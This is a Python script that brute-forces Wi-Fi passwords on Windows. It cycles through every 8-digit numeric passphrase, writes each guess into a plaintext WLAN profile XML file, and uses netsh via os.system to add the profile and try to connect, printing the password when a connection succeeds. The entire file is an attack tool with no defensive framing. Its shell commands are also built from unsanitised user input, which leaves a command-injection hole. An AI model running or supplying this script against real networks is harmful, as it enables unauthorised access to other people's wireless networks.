from itertools import product
import re
import os
import subprocess

# function to establish a new connection
def createNewConnection(name, SSID, password):
    config = """<?xml version=\"1.0\"?>
            <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
                <name>"""+name+"""</name>
                <SSIDConfig>
                    <SSID>
                        <name>"""+SSID+"""</name>
                    </SSID>
                </SSIDConfig>
                <connectionType>ESS</connectionType>
                <connectionMode>auto</connectionMode>
                <MSM>
                    <security>
                        <authEncryption>
                            <authentication>WPA2PSK</authentication>
                            <encryption>AES</encryption>
                            <useOneX>false</useOneX>
                        </authEncryption>
                        <sharedKey>
                            <keyType>passPhrase</keyType>
                            <protected>false</protected>
                            <keyMaterial>"""+password+"""</keyMaterial>
                        </sharedKey>
                    </security>
                </MSM>
            </WLANProfile>"""
    command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
    with open(name+".xml", 'w') as file:
        file.write(config)
    os.system(command)
 
# function to connect to a network   
def connect(name, SSID):
    command = "netsh wlan connect name=\""+name+"\" ssid=\""+SSID+"\" interface=Wi-Fi"
    os.system(command)
 
# function to display avavilabe Wifi networks   
def displayAvailableNetworks():
    command = "netsh wlan show networks interface=Wi-Fi"
    os.system(command)

displayAvailableNetworks()

name = input("Name of Wi-Fi: ")

def raid():
    chars = '0123456789'

    for length in range(8, 9): 
        to_attempt = product(chars, repeat=length)
        for attempt in to_attempt:
            print(''.join(attempt))
            createNewConnection(name, name, ''.join(attempt))
            connect(name, name) 
            try: 
                if re.sub(' +', ' ', subprocess.check_output("Netsh WLAN show interfaces").decode('utf-8').split("SSID",1)[1].split("BSSID")[0].replace(':', '').replace('\n', '')) == name:
                    print('connected to: ' + name)
                    print('The wifi password is: ' + ''.join(attempt))
                    break
            except Exception:
                print('Not connected')

raid()